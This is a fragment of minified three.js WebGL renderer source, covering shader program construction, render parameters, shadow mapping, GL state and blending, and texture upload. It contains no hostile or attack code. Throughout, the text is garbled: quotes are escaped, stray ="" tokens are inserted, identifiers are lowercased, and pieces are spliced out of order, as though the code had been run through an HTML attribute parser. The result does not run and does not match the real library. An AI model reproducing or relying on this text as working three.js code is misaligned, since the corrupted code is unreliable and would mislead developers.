e(a,b,c){a=\"a||{};return[a.derivatives||b.envMapCubeUV||b.bumpMap||b.normalMap||b.flatShading?\"#extension\" gl_oes_standard_derivatives=\"\" :=\"\" enable\":\"\",(a.fragdepth||b.logarithmicdepthbuffer)&&c.get(\"ext_frag_depth\")?\"#extension=\"\" gl_ext_frag_depth=\"\" enable\":\"\",a.drawbuffers&&c.get(\"webgl_draw_buffers\")?\"#extension=\"\" gl_ext_draw_buffers=\"\" require\":\"\",(a.shadertexturelod||b.envmap)&&c.get(\"ext_shader_texture_lod\")?\"#extension=\"\" gl_ext_shader_texture_lod=\"\" enable\":=\"\" \"\"].filter(g).join(\"\\n\")}function=\"\" f(a){var=\"\" b=\"[],c;for(c\" a){var=\"\" \"+c+\"=\"\" \"+d)}return=\"\" b.join(\"\\n\")}function=\"\" g(a){return\"\"!=\"=a}function\" h(a,b){return=\"\" a.replace(=\"\" num_dir_lights=\"\" g,b.numdirlights).replace(=\"\" num_spot_lights=\"\" g,b.numspotlights).replace(=\"\" num_point_lights=\"\" g,b.numpointlights).replace(=\"\" num_hemi_lights=\"\" g,b.numhemilights)}function=\"\" k(a){return=\"\" #include=\"\" +<([\\w\\d.]+)=\"\">/g,function(a,b){var c=THREE.ShaderChunk[b];if(void 0===c)throw Error(\"Can not resolve #include <\"+ b+\"=\"\">\");return k(c)})}function l(a){return a.replace(/for \\( int i \\= (\\d+)\\; i < (\\d+)\\; i \\+\\+ \\) \\{([\\s\\S]+?)(?=\\})\\}/g,function(a,b,c,d){a=\"\";for(b=parseInt(b);b<parseint(c);b++)a+=d.replace( 0=\"==F&&(F=new\" \\[=\"\" i=\"\" \\]=\"\" g,\"[=\"\" \"+b+\"=\"\" ]\");return=\"\" a})}var=\"\" n=\"0;return\" function(a,m,q,r){var=\"\" s=\"a.context,t=q.extensions,u=q.defines,v=q.__webglShader.vertexShader,C=q.__webglShader.fragmentShader,w=\"SHADOWMAP_TYPE_BASIC\";r.shadowMapType===THREE.PCFShadowMap?w=\"SHADOWMAP_TYPE_PCF\":r.shadowMapType===THREE.PCFSoftShadowMap&&(w=\"SHADOWMAP_TYPE_PCF_SOFT\");\" var=\"\" e=\"ENVMAP_TYPE_CUBE\" ,z=\"ENVMAP_MODE_REFLECTION\" ,y=\"ENVMAP_BLENDING_MULTIPLY\" ;if(r.envmap){switch(q.envmap.mapping){case=\"\" three.cubereflectionmapping:case=\"\" three.cuberefractionmapping:e=\"ENVMAP_TYPE_CUBE\" ;break;case=\"\" three.cubeuvreflectionmapping:case=\"\" three.cubeuvrefractionmapping:e=\"ENVMAP_TYPE_CUBE_UV\" three.equirectangularreflectionmapping:case=\"\" three.equirectangularrefractionmapping:e=\"ENVMAP_TYPE_EQUIREC\" three.sphericalreflectionmapping:e=\"ENVMAP_TYPE_SPHERE\" }switch(q.envmap.mapping){case=\"\" three.cuberefractionmapping:case=\"\" three.equirectangularrefractionmapping:z=\"ENVMAP_MODE_REFRACTION\" }switch(q.combine){case=\"\" three.multiplyoperation:y=\"ENVMAP_BLENDING_MULTIPLY\" three.mixoperation:y=\"ENVMAP_BLENDING_MIX\" three.addoperation:y=\"ENVMAP_BLENDING_ADD\" }}var=\"\" a=\"0<a.gammaFactor?a.gammaFactor:1,t=e(t,r,a.extensions),I=f(u),B=s.createProgram();q\" instanceof=\"\" three.rawshadermaterial?(u=\"[I].filter(g).join(\"\\n\"),w=[I].filter(g).join(\"\\n\")):(u=[\"precision\" \"+r.precision+\"=\"\" float;\",\"precision=\"\" int;\",\"#define=\"\" shader_name=\"\" \"+q.__webglshader.name,=\"\" i,r.supportsvertextextures?\"#define=\"\" vertex_textures\":\"\",\"#define=\"\" gamma_factor=\"\" \"+a,\"#define=\"\" max_bones=\"\" \"+r.maxbones,r.map?\"#define=\"\" use_map\":\"\",r.envmap?\"#define=\"\" use_envmap\":\"\",r.envmap?\"#define=\"\" \"+z:\"\",r.lightmap?\"#define=\"\" use_lightmap\":\"\",r.aomap?\"#define=\"\" use_aomap\":\"\",r.emissivemap?\"#define=\"\" use_emissivemap\":\"\",r.bumpmap?\"#define=\"\" use_bumpmap\":\"\",r.normalmap?\"#define=\"\" use_normalmap\":\"\",r.displacementmap&&r.supportsvertextextures?\"#define=\"\" use_displacementmap\":\"\",r.specularmap?\"#define=\"\" use_specularmap\":=\"\" \"\",r.roughnessmap?\"#define=\"\" use_roughnessmap\":\"\",r.metalnessmap?\"#define=\"\" use_metalnessmap\":\"\",r.alphamap?\"#define=\"\" use_alphamap\":\"\",r.vertexcolors?\"#define=\"\" use_color\":\"\",r.flatshading?\"#define=\"\" flat_shaded\":\"\",r.skinning?\"#define=\"\" use_skinning\":\"\",r.usevertextexture?\"#define=\"\" bone_texture\":\"\",r.morphtargets?\"#define=\"\" use_morphtargets\":\"\",r.morphnormals&&!1=\"==r.flatShading?\"#define\" use_morphnormals\":\"\",r.doublesided?\"#define=\"\" double_sided\":\"\",r.flipsided?\"#define=\"\" flip_sided\":\"\",\"#define=\"\" num_clipping_planes=\"\" \"+=\"\" r.numclippingplanes,r.shadowmapenabled?\"#define=\"\" use_shadowmap\":\"\",r.shadowmapenabled?\"#define=\"\" \"+w:\"\",r.sizeattenuation?\"#define=\"\" use_sizeattenuation\":\"\",r.logarithmicdepthbuffer?\"#define=\"\" use_logdepthbuf\":\"\",r.logarithmicdepthbuffer&&a.extensions.get(\"ext_frag_depth\")?\"#define=\"\" use_logdepthbuf_ext\":\"\",\"uniform=\"\" mat4=\"\" modelmatrix;\",\"uniform=\"\" modelviewmatrix;\",\"uniform=\"\" projectionmatrix;\",\"uniform=\"\" viewmatrix;\",\"uniform=\"\" mat3=\"\" normalmatrix;\",\"uniform=\"\" vec3=\"\" cameraposition;\",\"attribute=\"\" position;\",=\"\" \"attribute=\"\" normal;\",\"attribute=\"\" vec2=\"\" uv;\",\"#ifdef=\"\" use_color\",\"\\tattribute=\"\" color;\",\"#endif\",\"#ifdef=\"\" use_morphtargets\",\"\\tattribute=\"\" morphtarget0;\",\"\\tattribute=\"\" morphtarget1;\",\"\\tattribute=\"\" morphtarget2;\",\"\\tattribute=\"\" morphtarget3;\",\"\\t#ifdef=\"\" use_morphnormals\",\"\\t\\tattribute=\"\" morphnormal0;\",\"\\t\\tattribute=\"\" morphnormal1;\",\"\\t\\tattribute=\"\" morphnormal2;\",\"\\t\\tattribute=\"\" morphnormal3;\",\"\\t#else\",\"\\t\\tattribute=\"\" morphtarget4;\",\"\\t\\tattribute=\"\" morphtarget5;\",=\"\" \"\\t\\tattribute=\"\" morphtarget6;\",\"\\t\\tattribute=\"\" morphtarget7;\",\"\\t#endif\",\"#endif\",\"#ifdef=\"\" use_skinning\",\"\\tattribute=\"\" vec4=\"\" skinindex;\",\"\\tattribute=\"\" skinweight;\",\"#endif\",\"\\n\"].filter(g).join(\"\\n\"),w=\"[t,\"precision\" \"+q.__webglshader.name,i,r.alphatest?\"#define=\"\" alphatest=\"\" \"+r.alphatest:\"\",\"#define=\"\" \"+a,r.usefog&&r.fog?\"#define=\"\" use_fog\":\"\",r.usefog&&r.fogexp?\"#define=\"\" fog_exp2\":\"\",r.map?\"#define=\"\" use_map\":=\"\" \"\",r.envmap?\"#define=\"\" \"+e:\"\",r.envmap?\"#define=\"\" \"+z:\"\",r.envmap?\"#define=\"\" \"+y:\"\",r.lightmap?\"#define=\"\" use_normalmap\":\"\",r.specularmap?\"#define=\"\" use_specularmap\":\"\",r.roughnessmap?\"#define=\"\" use_color\":=\"\" \"\",r.flatshading?\"#define=\"\" flat_shaded\":\"\",r.doublesided?\"#define=\"\" \"+r.numclippingplanes,r.shadowmapenabled?\"#define=\"\" \"+w:\"\",r.premultipliedalpha?\"#define=\"\" premultiplied_alpha\":\"\",r.physicallycorrectlights?\"#define=\"\" physically_correct_lights\":\"\",r.logarithmicdepthbuffer?\"#define=\"\" use_logdepthbuf_ext\":=\"\" \"\",r.envmap&&a.extensions.get(\"ext_shader_texture_lod\")?\"#define=\"\" texture_lod_ext\":\"\",\"uniform=\"\" cameraposition;\",r.tonemapping!=\"=THREE.NoToneMapping?\"#define\" tone_mapping\":\"\",r.tonemapping!=\"=THREE.NoToneMapping?THREE.ShaderChunk.tonemapping_pars_fragment:\"\",r.toneMapping!==THREE.NoToneMapping?d(\"toneMapping\",r.toneMapping):\"\",r.outputEncoding||r.mapEncoding||r.envMapEncoding||r.emissiveMapEncoding?THREE.ShaderChunk.encodings_pars_fragment:\"\",r.mapEncoding?b(\"mapTexelToLinear\",\" r.mapencoding):\"\",r.envmapencoding?b(\"envmaptexeltolinear\",r.envmapencoding):\"\",r.emissivemapencoding?b(\"emissivemaptexeltolinear\",r.emissivemapencoding):\"\",r.outputencoding?c(\"lineartooutputtexel\",r.outputencoding):\"\",r.depthpacking?\"#define=\"\" depth_packing=\"\" \"+q.depthpacking:\"\",\"\\n\"].filter(g).join(\"\\n\"));v=\"k(v,r);v=h(v,r);C=k(C,r);C=h(C,r);!1===q\" three.shadermaterial&&(v=\"l(v),C=l(C));C=w+C;v=THREE.WebGLShader(s,s.VERTEX_SHADER,u+v);C=THREE.WebGLShader(s,s.FRAGMENT_SHADER,C);s.attachShader(B,\" v);s.attachshader(b,c);void=\"\" 0!=\"=q.index0AttributeName?s.bindAttribLocation(B,0,q.index0AttributeName):!0===r.morphTargets&&s.bindAttribLocation(B,0,\"position\");s.linkProgram(B);r=s.getProgramInfoLog(B);E=s.getShaderInfoLog(v);z=s.getShaderInfoLog(C);A=y=!0;if(!1===s.getProgramParameter(B,s.LINK_STATUS))y=!1,console.error(\"THREE.WebGLProgram:\" shader=\"\" error:=\"\" \",s.geterror(),\"gl.validate_status\",s.getprogramparameter(b,s.validate_status),\"gl.getprograminfolog\",r,e,z);else=\"\" if(\"\"!=\"=r)console.warn(\"THREE.WebGLProgram:\" gl.getprograminfolog()\",=\"\" r);else=\"\" if(\"\"=\"==E||\"\"===z)A=!1;A&&(this.diagnostics={runnable:y,material:q,programLog:r,vertexShader:{log:E,prefix:u},fragmentShader:{log:z,prefix:w}});s.deleteShader(v);s.deleteShader(C);var\" f;this.getuniforms=\"function(){void\" three.webgluniforms(s,b,a));return=\"\" f};var=\"\" k;this.getattributes=\"function(){if(void\" d=\"s.getActiveAttrib(B,c).name;a[d]=s.getAttribLocation(B,d)}K=a}return\" k};this.destroy=\"function(){s.deleteProgram(B);\" this.program=\"void\" 0};object.defineproperties(this,{uniforms:{get:function(){console.warn(\"three.webglprogram:=\"\" .uniforms=\"\" is=\"\" now=\"\" .getuniforms().\");return=\"\" this.getuniforms()}},attributes:{get:function(){console.warn(\"three.webglprogram:=\"\" .attributes=\"\" .getattributes().\");return=\"\" this.getattributes()}}});this.id=\"n++;this.code=m;this.usedTimes=1;this.program=B;this.vertexShader=v;this.fragmentShader=C;return\" this}}();=\"\" three.webglprograms=\"function(a,b){function\" c(a,b){var=\"\" c;a?a=\"\" three.texture?c=\"a.encoding:a\" three.webglrendertarget&&(console.warn(\"three.webglprograms.gettextureencodingfrommap:=\"\" don't=\"\" use=\"\" render=\"\" targets=\"\" as=\"\" textures.=\"\" their=\"\" .texture=\"\" property=\"\" instead.\"),c=\"a.texture.encoding):c=THREE.LinearEncoding;c===THREE.LinearEncoding&&b&&(c=THREE.GammaEncoding);return\" c}var=\"\" meshphongmaterial:\"phong\",meshstandardmaterial:\"physical\",meshphysicalmaterial:\"physical\",linebasicmaterial:\"basic\",linedashedmaterial:\"dashed\",pointsmaterial:\"points\"},f=\"precision supportsVertexTextures map mapEncoding envMap envMapMode envMapEncoding lightMap aoMap emissiveMap emissiveMapEncoding bumpMap normalMap displacementMap specularMap roughnessMap metalnessMap alphaMap combine vertexColors fog useFog fogExp flatShading sizeAttenuation logarithmicDepthBuffer skinning maxBones useVertexTexture morphTargets morphNormals maxMorphTargets maxMorphNormals premultipliedAlpha numDirLights numPointLights numSpotLights numHemiLights shadowMapEnabled shadowMapType toneMapping physicallyCorrectLights alphaTest doubleSided flipSided numClippingPlanes depthPacking\" .split(\"=\"\" \");=\"\" this.getparameters=\"function(d,f,k,l,n){var\" p=\"e[d.type],m;b.floatVertexTextures&&n&&n.skeleton&&n.skeleton.useVertexTexture?m=1024:(m=Math.floor((b.maxVertexUniforms-20)/4),void\" three.skinnedmesh&&(m=\"Math.min(n.skeleton.bones.length,m),m<n.skeleton.bones.length&&console.warn(\"WebGLRenderer:\" too=\"\" many=\"\" bones=\"\" -=\"\" \"+n.skeleton.bones.length+\",=\"\" this=\"\" gpu=\"\" supports=\"\" just=\"\" \"+m+\"=\"\" (try=\"\" opengl=\"\" instead=\"\" of=\"\" angle)\")));var=\"\" q=\"a.getPrecision();null!==d.precision&&(q=b.getMaxPrecision(d.precision),q!==\" d.precision&&console.warn(\"three.webglprogram.getparameters:\",d.precision,\"not=\"\" supported,=\"\" using\",q,\"instead.\"));var=\"\" r=\"a.getCurrentRenderTarget();return{shaderID:p,precision:q,supportsVertexTextures:b.vertexTextures,outputEncoding:c(r?r.texture:null,a.gammaOutput),map:!!d.map,mapEncoding:c(d.map,a.gammaInput),envMap:!!d.envMap,envMapMode:d.envMap&&d.envMap.mapping,envMapEncoding:c(d.envMap,a.gammaInput),envMapCubeUV:!!d.envMap&&(d.envMap.mapping===THREE.CubeUVReflectionMapping||d.envMap.mapping===\" three.cubeuvrefractionmapping),lightmap:!!d.lightmap,aomap:!!d.aomap,emissivemap:!!d.emissivemap,emissivemapencoding:c(d.emissivemap,a.gammainput),bumpmap:!!d.bumpmap,normalmap:!!d.normalmap,displacementmap:!!d.displacementmap,roughnessmap:!!d.roughnessmap,metalnessmap:!!d.metalnessmap,specularmap:!!d.specularmap,alphamap:!!d.alphamap,combine:d.combine,vertexcolors:d.vertexcolors,fog:k,usefog:d.fog,fogexp:k=\"\" three.fogexp2,flatshading:d.shading=\"==THREE.FlatShading,sizeAttenuation:d.sizeAttenuation,\" logarithmicdepthbuffer:b.logarithmicdepthbuffer,skinning:d.skinning,maxbones:m,usevertextexture:b.floatvertextextures&&n&&n.skeleton&&n.skeleton.usevertextexture,morphtargets:d.morphtargets,morphnormals:d.morphnormals,maxmorphtargets:a.maxmorphtargets,maxmorphnormals:a.maxmorphnormals,numdirlights:f.directional.length,numpointlights:f.point.length,numspotlights:f.spot.length,numhemilights:f.hemi.length,numclippingplanes:l,shadowmapenabled:a.shadowmap.enabled&&n.receiveshadow&&0<f.shadows.length,shadowmaptype:a.shadowmap.type,=\"\" tonemapping:a.tonemapping,physicallycorrectlights:a.physicallycorrectlights,premultipliedalpha:d.premultipliedalpha,alphatest:d.alphatest,doublesided:d.side=\"==THREE.DoubleSide,flipSided:d.side===THREE.BackSide,depthPacking:void\" c=\"[];b.shaderID?c.push(b.shaderID):(c.push(a.fragmentShader),c.push(a.vertexShader));if(void\" in=\"\" a.defines)c.push(d),c.push(a.defines[d]);for(d=\"0;d<f.length;d++)c.push(b[f[d]]);\" return=\"\" c.join()};this.acquireprogram=\"function(b,c,e){for(var\" f,n=\"0,p=d.length;n<p;n++){var\" m=\"d[n];if(m.code===e){f=m;++f.usedTimes;break}}void\" three.webglprogram(a,e,b,c),d.push(f));return=\"\" f};this.releaseprogram=\"function(a){if(0===--a.usedTimes){var\" b=\"d.indexOf(a);d[b]=d[d.length-1];d.pop();a.destroy()}};this.programs=d};\" three.webglproperties=\"function(){var\" c};this.delete=\"function(b){delete\" a[b.uuid]};this.clear=\"function(){a={}}};\" three.webglshader=\"function(){function\" a(a){a=\"a.split(\"\\n\");for(var\" \"+a[c];return=\"\" a.join(\"\\n\")}return=\"\" function(b,c,d){var=\"\" couldn't=\"\" compile.\");\"\"!=\"=b.getShaderInfoLog(e)&&console.warn(\"THREE.WebGLShader:\" gl.getshaderinfolog()\",c=\"==b.VERTEX_SHADER?\"vertex\":\"fragment\",b.getShaderInfoLog(e),a(d));return\" e}}();=\"\" three.webglshadowmap=\"function(a,b,c){function\" d(b,c,d,e){var=\"\" f=\"b.geometry,g=null,g=r,h=b.customDepthMaterial;d&&(g=s,h=b.customDistanceMaterial);h?g=h:(b=b\" three.skinnedmesh&&c.skinning,h=\"0,void\" g}function=\"\" e(a,b,c){if(!1!=\"=a.visible){a.layers.test(b.layers)&&(a\" three.mesh||a=\"\" three.line||a=\"\" three.points)&&a.castshadow&&(!1=\"==a.frustumCulled||!0===h.intersectsObject(a))&&!0===a.material.visible&&(a.modelViewMatrix.multiplyMatrices(c.matrixWorldInverse,a.matrixWorld),q.push(a));a=a.children;for(var\" three.frustum,k=\"new\" three.matrix4,l=\"b.shadows,n=new\" three.vector2,p=\"new\" three.vector3,m=\"new\" three.vector3,q=\"[],r=Array(4),s=Array(4),t={},u=[new\" three.vector3(1,0,0),new=\"\" three.vector3(-1,0,0),new=\"\" three.vector3(0,0,1),new=\"\" three.vector3(0,=\"\" 0,-1),new=\"\" three.vector3(0,1,0),new=\"\" three.vector3(0,-1,0)],v=\"[new\" three.vector3(0,0,-1)],c=\"[new\" three.vector4,new=\"\" three.vector4];b=\"new\" three.meshdepthmaterial;b.depthpacking=\"THREE.RGBADepthPacking;b.clipping=!0;for(var\" w=\"THREE.ShaderLib.distanceRGBA,E=THREE.UniformsUtils.clone(w.uniforms),z=0;4!==z;++z){var\" y=\"0!==(z&1),A=0!==(z&2),I=b.clone();I.morphTargets=y;I.skinning=A;r[z]=I;y=new\" three.shadermaterial({defines:{use_shadowmap:\"\"},uniforms:e,vertexshader:w.vertexshader,fragmentshader:w.fragmentshader,morphtargets:y,skinning:a,clipping:!0});s[z]=\"y}var\" 1,1,1);g.disable(f.blend);g.setdepthtest(!0);g.setscissortest(!1);for(var=\"\" w,s,t=\"0,y=l.length;t<y;t++){var\" z=\"l[t],A=z.shadow;if(void\" no=\"\" shadow.\");else{var=\"\" three.pointlight){w=\"6;s=!0;var\" j=\"n.x,D=n.y;C[0].set(2*J,D,J,D);C[1].set(0,D,J,D);C[2].set(3*J,D,J,D);C[3].set(J,D,J,D);C[4].set(3*J,0,J,D);C[5].set(J,0,J,D);n.x*=4;n.y*=2}else\" three.webglrendertarget(n.x,n.y,{minfilter:three.nearestfilter,=\"\" magfilter:three.nearestfilter,format:three.rgbaformat}),e.updateprojectionmatrix());a=\"\" three.spotlightshadow&&a.update(z);j=\"A.map;A=A.matrix;m.setFromMatrixPosition(z.matrixWorld);E.position.copy(m);a.setRenderTarget(J);a.clear();for(J=0;J<w;J++){s?(p.copy(E.position),p.add(u[J]),E.up.copy(v[J]),E.lookAt(p),g.viewport(C[J])):(p.setFromMatrixPosition(z.target.matrixWorld),E.lookAt(p));E.updateMatrixWorld();E.matrixWorldInverse.getInverse(E.matrixWorld);A.set(.5,0,0,.5,0,.5,0,.5,0,0,.5,.5,\" 0,0,0,1);a.multiply(e.projectionmatrix);a.multiply(e.matrixworldinverse);k.multiplymatrices(e.projectionmatrix,e.matrixworldinverse);h.setfrommatrix(k);q.length=\"0;e(b,r,E);for(var\" three.multimaterial)for(var=\"\" ja=\"T.groups,X=X.materials,ba=0,ia=ja.length;ba<ia;ba++){var\" v=\"ja[ba],Y=X[V.materialIndex];!0===Y.visible&&(Y=d(I,Y,s,m),a.renderBufferDirect(E,null,T,Y,I,V))}else\" a.getclearcolor();s=\"a.getClearAlpha();a.setClearColor(w,s);B.needsUpdate=!1}}};\" three.webglstate=\"function(a,b,c){function\" d(b,c,d){var=\"\" uint8array(4),f=\"a.createTexture();a.bindTexture(b,f);a.texParameteri(b,a.TEXTURE_MIN_FILTER,a.NEAREST);a.texParameteri(b,a.TEXTURE_MAG_FILTER,a.NEAREST);for(b=0;b<d;b++)a.texImage2D(c+b,0,a.RGBA,1,1,0,a.RGBA,a.UNSIGNED_BYTE,e);return\" f}var=\"\" three.webglcolorbuffer(a,this),depth:new=\"\" three.webgldepthbuffer(a,this),stencil:new=\"\" three.webglstencilbuffer(a,this)};var=\"\" uint8array(f),=\"\" h=\"new\" uint8array(f),k=\"new\" uint8array(f),l=\"{},n=null,p=null,m=null,q=null,r=null,s=null,t=null,u=null,v=!1,C=null,w=null,E=null,z=null,y=null,A=null,I=a.getParameter(a.MAX_TEXTURE_IMAGE_UNITS),B=null,F={},K=new\" three.vector4,p=\"new\" three.vector4,m=\"{};M[a.TEXTURE_2D]=d(a.TEXTURE_2D,a.TEXTURE_2D,1);M[a.TEXTURE_CUBE_MAP]=d(a.TEXTURE_CUBE_MAP,a.TEXTURE_CUBE_MAP_POSITIVE_X,6);this.init=function(){this.clearColor(0,0,0,1);this.clearDepth(1);this.clearStencil(0);this.enable(a.DEPTH_TEST);this.setDepthFunc(THREE.LessEqualDepth);\" this.setflipsided(!1);this.setcullface(three.cullfaceback);this.enable(a.cull_face);this.enable(a.blend);this.setblending(three.normalblending)};this.initattributes=\"function(){for(var\" c),k[b]=\"c)};this.disableUnusedAttributes=function(){for(var\" c.length;d++)n.push(c[d]);return=\"\" n};this.setblending=\"function(b,d,e,f,g,h,k,l){if(b!==THREE.NoBlending){this.enable(a.BLEND);if(b!==p||l!==v)b===THREE.AdditiveBlending?l?(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.ONE,a.ONE,a.ONE,a.ONE)):(a.blendEquation(a.FUNC_ADD),a.blendFunc(a.SRC_ALPHA,a.ONE)):b===THREE.SubtractiveBlending?l?(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.ZERO,a.ZERO,a.ONE_MINUS_SRC_COLOR,a.ONE_MINUS_SRC_ALPHA)):(a.blendEquation(a.FUNC_ADD),\" a.blendfunc(a.zero,a.one_minus_src_color)):b=\"==THREE.MultiplyBlending?l?(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.ZERO,a.SRC_COLOR,a.ZERO,a.SRC_ALPHA)):(a.blendEquation(a.FUNC_ADD),a.blendFunc(a.ZERO,a.SRC_COLOR)):l?(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.ONE,a.ONE_MINUS_SRC_ALPHA,a.ONE,a.ONE_MINUS_SRC_ALPHA)):(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.SRC_ALPHA,a.ONE_MINUS_SRC_ALPHA,a.ONE,a.ONE_MINUS_SRC_ALPHA)),\" u=\"t=s=r=q=m=null}else\" this.disable(a.blend),p=\"b};this.setColorWrite=function(a){this.buffers.color.setMask(a)};this.setDepthTest=function(a){this.buffers.depth.setTest(a)};this.setDepthWrite=function(a){this.buffers.depth.setMask(a)};this.setDepthFunc=function(a){this.buffers.depth.setFunc(a)};\" this.setstenciltest=\"function(a){this.buffers.stencil.setTest(a)};this.setStencilWrite=function(a){this.buffers.stencil.setMask(a)};this.setStencilFunc=function(a,b,c){this.buffers.stencil.setFunc(a,b,c)};this.setStencilOp=function(a,b,c){this.buffers.stencil.setOp(a,b,c)};this.setFlipSided=function(b){C!==b&&(b?a.frontFace(a.CW):a.frontFace(a.CCW),C=b)};this.setCullFace=function(b){b!==THREE.CullFaceNone?(this.enable(a.CULL_FACE),b!==w&&(b===THREE.CullFaceBack?a.cullFace(a.BACK):b===THREE.CullFaceFront?\" a.cullface(a.front):a.cullface(a.front_and_back))):this.disable(a.cull_face);w=\"b};this.setLineWidth=function(b){b!==E&&(a.lineWidth(b),E=b)};this.setPolygonOffset=function(b,c,d){if(b){if(this.enable(a.POLYGON_OFFSET_FILL),z!==c||y!==d)a.polygonOffset(c,d),z=c,y=d}else\" this.disable(a.polygon_offset_fill)};this.getscissortest=\"function(){return\" a};this.setscissortest=\"function(b){(A=b)?this.enable(a.SCISSOR_TEST):this.disable(a.SCISSOR_TEST)};this.activeTexture=function(b){void\" i-1);b!=\"=b&&(a.activeTexture(b),B=b)};this.bindTexture=function(b,c){null===B&&e.activeTexture();var\" 0,texture:void=\"\" 0},f[b]=\"d);if(d.type!==b||d.texture!==c)a.bindTexture(b,c||M[b]),d.type=b,d.texture=c};this.compressedTexImage2D=function(){try{a.compressedTexImage2D.apply(a,arguments)}catch(b){console.error(b)}};this.texImage2D=function(){try{a.texImage2D.apply(a,arguments)}catch(b){console.error(b)}};this.clearColor=function(a,b,c,d){this.buffers.color.setClear(a,\" b,c,d)};this.cleardepth=\"function(a){this.buffers.depth.setClear(a)};this.clearStencil=function(a){this.buffers.stencil.setClear(a)};this.scissor=function(b){!1===K.equals(b)&&(a.scissor(b.x,b.y,b.z,b.w),K.copy(b))};this.viewport=function(b){!1===P.equals(b)&&(a.viewport(b.x,b.y,b.z,b.w),P.copy(b))};this.reset=function(){for(var\" three.webglcolorbuffer=\"function(a,b){var\" three.vector4,e=\"null,f=new\" three.vector4;this.setmask=\"function(b){e===b||c||(a.colorMask(b,b,b,b),e=b)};this.setLocked=function(a){c=a};this.setClear=function(b,c,e,l){d.set(b,c,e,l);!1===f.equals(d)&&(a.clearColor(b,c,e,l),f.copy(d))};this.reset=function(){c=!1;e=null;f=new\" three.vector4}};=\"\" three.webgldepthbuffer=\"function(a,b){var\" three.neverdepth:a.depthfunc(a.never);break;case=\"\" three.alwaysdepth:a.depthfunc(a.always);break;case=\"\" three.lessdepth:a.depthfunc(a.less);break;case=\"\" three.lessequaldepth:a.depthfunc(a.lequal);break;case=\"\" three.equaldepth:a.depthfunc(a.equal);break;case=\"\" three.greaterequaldepth:a.depthfunc(a.gequal);=\"\" break;case=\"\" three.greaterdepth:a.depthfunc(a.greater);break;case=\"\" three.notequaldepth:a.depthfunc(a.notequal);break;default:a.depthfunc(a.lequal)}else=\"\" a.depthfunc(a.lequal);e=\"b}};this.setLocked=function(a){c=a};this.setClear=function(b){f!==b&&(a.clearDepth(b),f=b)};this.reset=function(){c=!1;f=e=d=null}};\" three.webglstencilbuffer=\"function(a,b){var\" function(){c=\"!1;n=l=k=h=g=f=e=d=null}};\" three.webgltextures=\"function(a,b,c,d,e,f,g){function\" h(a,b){if(a.width=\"\">b||a.height>b){var c=b/Math.max(a.width,a.height),d=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\");d.width=Math.floor(a.width*c);d.height=Math.floor(a.height*c);d.getContext(\"2d\").drawImage(a,0,0,a.width,a.height,0,0,d.width,d.height);console.warn(\"THREE.WebGLRenderer: image is too big (\"+a.width+\"x\"+a.height+\"). Resized to \"+d.width+\"x\"+d.height,a);return d}return a}function k(a){return THREE.Math.isPowerOfTwo(a.width)&&THREE.Math.isPowerOfTwo(a.height)}\nfunction l(b){return b===THREE.NearestFilter||b===THREE.NearestMipMapNearestFilter||b===THREE.NearestMipMapLinearFilter?a.NEAREST:a.LINEAR}function n(b){b=b.target;b.removeEventListener(\"dispose\",n);a:{var c=d.get(b);if(b.image&&c.__image__webglTextureCube)a.deleteTexture(c.__image__webglTextureCube);else{if(void 0===c.__webglInit)break a;a.deleteTexture(c.__webglTexture)}d.delete(b)}t.textures--}function p(b){b=b.target;b.removeEventListener(\"dispose\",p);var c=d.get(b),e=d.get(b.texture);if(b){void 0!==\ne.__webglTexture&&a.deleteTexture(e.__webglTexture);b.depthTexture&&b.depthTexture.dispose();if(b instanceof THREE.WebGLRenderTargetCube)for(e=0;6>e;e++)a.deleteFramebuffer(c.__webglFramebuffer[e]),c.__webglDepthbuffer&&a.deleteRenderbuffer(c.__webglDepthbuffer[e]);else a.deleteFramebuffer(c.__webglFramebuffer),c.__webglDepthbuffer&&a.deleteRenderbuffer(c.__webglDepthbuffer);d.delete(b.texture);d.delete(b)}t.textures--}function m(b,g){var m=d.get(b);if(0<b.version&&m.__version!==b.version){var 0=\"==l)console.warn(\"THREE.WebGLRenderer:\" l=\"b.image;if(void\" texture=\"\" marked=\"\" for=\"\" update=\"\" but=\"\" image=\"\" is=\"\" undefined\",b);else=\"\" if(!1=\"==l.complete)console.warn(\"THREE.WebGLRenderer:\" incomplete\",b);else{void=\"\" b.premultiplyalpha);a.pixelstorei(a.unpack_alignment,b.unpackalignment);var=\"\" p=\"h(b.image,e.maxTextureSize);if((b.wrapS!==THREE.ClampToEdgeWrapping||b.wrapT!==THREE.ClampToEdgeWrapping||b.minFilter!==THREE.NearestFilter&&b.minFilter!==THREE.LinearFilter)&&!1===k(p))if(l=p,l\" instanceof=\"\" htmlimageelement||l=\"\" htmlcanvaselement){var=\"\" r=\"document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\");r.width=THREE.Math.nearestPowerOfTwo(l.width);r.height=THREE.Math.nearestPowerOfTwo(l.height);r.getContext(\"2d\").drawImage(l,\" 0,0,r.width,r.height);console.warn(\"three.webglrenderer:=\"\" not=\"\" power=\"\" of=\"\" two=\"\" (\"+l.width+\"x\"+l.height+\").=\"\" resized=\"\" to=\"\" \"+r.width+\"x\"+r.height,l);p=\"r}else\" i=\"b.mipmaps;if(b\" three.depthtexture){i=\"a.DEPTH_COMPONENT;if(b.type===THREE.FloatType){if(!u)throw\" error(\"float=\"\" depth=\"\" only=\"\" supported=\"\" in=\"\" webgl2.0\");i=\"a.DEPTH_COMPONENT32F}else\" u&&(i=\"a.DEPTH_COMPONENT16);c.texImage2D(a.TEXTURE_2D,0,I,p.width,p.height,0,r,s,null)}else\" if(b=\"\" three.datatexture)if(0<i.length&&l){for(var=\"\" b=\"0,F=I.length;B<F;B++)p=I[B],c.texImage2D(a.TEXTURE_2D,B,r,p.width,p.height,0,r,s,p.data);b.generateMipmaps=!1}else\" c.teximage2d(a.texture_2d,0,r,p.width,p.height,0,r,s,p.data);else=\"\" 